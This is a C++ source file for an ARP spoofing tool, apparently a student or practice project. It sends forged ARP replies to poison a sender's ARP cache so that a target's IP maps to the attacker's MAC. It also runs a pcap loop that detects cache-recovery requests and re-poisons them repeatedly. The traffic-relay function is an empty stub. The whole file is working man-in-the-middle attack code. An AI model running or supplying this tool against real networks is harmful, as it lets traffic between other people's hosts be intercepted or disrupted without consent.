#include "arp_spoof.h"

ArpSpoofSession::ArpSpoofSession(Agent sender, Agent target){
    this->sender = Agent(sender);
    this->target = Agent(target);
}

void ArpSpoofSession::print_session(){
    std::cout << "Sender" << std::endl;
    this->sender.show_info();
    std::cout << "Target" << std::endl;
    this->target.show_info();
}

int ArpSpoofer::create_session(std::string sender_name, std::string sender_ip, std::string target_name, std::string target_ip){
    Agent sender = Agent(sender_name);
    Agent target = Agent(target_name);

    sender.set_ip_str(sender_ip);
    target.set_ip_str(target_ip);

    ArpSpoofSession sess = ArpSpoofSession(sender, target);
    
    this->arp_sessions.push_back(sess);

    return this->arp_sessions.size();
}

void ArpSpoofer::print_sessions(){
    std::vector<ArpSpoofSession>::iterator iter;

    for(iter = this->arp_sessions.begin(); iter != this->arp_sessions.end() ; iter++){
        std::cout << "- Session" << iter - arp_sessions.begin() << " -" << std::endl;
        (*iter).print_session();
    }
}

void ArpSpoofer::acquire_target_mac(Agent *target){
    std::string target_ip_str = target->get_ip_str();

    if(arp_map.find(target_ip_str) == arp_map.end()){
        arp_get_target_mac(target);
        arp_map[target_ip_str] = target->get_mac_str();
    }
    else{
        target->set_mac_str(arp_map[target_ip_str]);
    }
}

void ArpSpoofer::acquire_sessions_hwaddr(){
    auto sess_iter = this->arp_sessions.begin();

    for(sess_iter; sess_iter!=this->arp_sessions.end(); sess_iter++){
        Agent *sender = (*sess_iter).get_sender();
        Agent *target = (*sess_iter).get_target();

        acquire_target_mac(sender);
        acquire_target_mac(target);
    }
}

bool ArpSpoofer::send_arp(Agent *sender, Agent *target){
    pktbyte_n *sender_mac = sender->get_mac();
    std::string sender_mac_str = sender->get_mac_str();
    std::string target_ip_str = target->get_ip_str();
    std::string attker_mac_str = this->get_mac_str();

    std::cout <<"[ARP / send_arp]" << std::endl;
    std::cout << "Sender MAC: " << sender_mac_str << std::endl;
    std::cout << "Target IP: " << target_ip_str << std::endl;
    std::cout << "Your MAC: " << attker_mac_str << std::endl;
    std::cout << std::endl;

    Agent::arp_send_raw(
        ARPOP_REPLY,            // op
        this->get_mac(),       // sha
        target->get_ip(),       // sip
        sender->get_mac(),      // tha
        sender->get_ip()        // tip
    );

    return true;
}

void ArpSpoofer::corrupt(){
    auto sess_iter = arp_sessions.begin();
    char errbuf[PCAP_ERRBUF_SIZE];
    const char * detector = "arp and (arp[6:2] = 1)";
    pcap_t *handle = pcap_open_live(get_dev().c_str(), BUFSIZ, 1, 1000, errbuf);
    struct pcap_pkthdr *header;
    const pktbyte_n *packet;
    pktbyte_n *sender_ip;
    std::string sender_ip_str;
    pktbyte_n *target_ip;
    std::string target_ip_str;
    pktbyte_n *sip;
    pktbyte_n *tip;

    if(handle == NULL) {
        std::cerr << "couldn't open device "<< this->get_dev() << ":" << errbuf << std::endl;
        exit(-1);
    }

    //Initially, corrupt all sender's ARP table
    for(sess_iter; sess_iter != arp_sessions.end(); sess_iter++){
        Agent *sender = (*sess_iter).get_sender();
        Agent *target = (*sess_iter).get_target();

        ArpSpoofer::send_arp(sender, target);
    }

    //disturb ARP recovery
    while(1){
        set_pcap_filter(handle, const_cast<char*>(detector), *(reinterpret_cast<bpf_u_int32*>(this->get_ip())));
        int res = pcap_next_ex(handle, &header, &packet);

        if(res == 0) continue;
        if(res == -1 || res == -2) break;

        Xpkt xpkt = Xpkt(const_cast<pktbyte_n *>(packet), header->len);

        Arp arp = Arp(xpkt);

        for(sess_iter=arp_sessions.begin(); sess_iter != arp_sessions.end(); sess_iter++){
            sip = arp.get_sip();
            tip = arp.get_tip();

            sender_ip = sess_iter->get_sender()->get_ip();
            sender_ip_str = sess_iter->get_sender()->get_ip_str();
            target_ip = sess_iter->get_target()->get_ip();
            target_ip_str = sess_iter->get_target()->get_ip_str();

            if(!memcmp(sip, sender_ip, 4) && !memcmp(tip, target_ip, 4)){
                std::cout << "[ArpSpoof / corrupt]" << std::endl;
                std::cout << "Recovery detected!" << std::endl;
                std::cout << "Arp request: " << sender_ip_str << " => " << target_ip_str << std::endl;
                ArpSpoofer::send_arp(sess_iter->get_sender(), sess_iter->get_target());
                usleep(100);
                ArpSpoofer::send_arp(sess_iter->get_sender(), sess_iter->get_target());
                usleep(100);
                ArpSpoofer::send_arp(sess_iter->get_sender(), sess_iter->get_target());
            }

            if(!memcmp(tip, sender_ip, 4) && !memcmp(sip, target_ip, 4)){
                std::cout << "[ArpSpoof / corrupt]" << std::endl;
                std::cout << "Recovery detected!" << std::endl;
                std::cout << "Arp request: " << target_ip_str << " => " << sender_ip_str << std::endl;
                ArpSpoofer::send_arp(sess_iter->get_sender(), sess_iter->get_target());
                usleep(100);
                ArpSpoofer::send_arp(sess_iter->get_sender(), sess_iter->get_target());
                usleep(100);
                ArpSpoofer::send_arp(sess_iter->get_sender(), sess_iter->get_target());
            }
        }
    }
}
void ArpSpoofer::relay(){}

void ArpSpoofer::start_sessions(){
    corrupter = std::thread(&ArpSpoofer::corrupt, this);
    relayer = std::thread(&ArpSpoofer::relay, this);
}

void ArpSpoofer::join_sessions(){
    corrupter.join();
    relayer.join();
}

bool ArpSpoofer::arp_spoof(){
    start_sessions();
    join_sessions();
}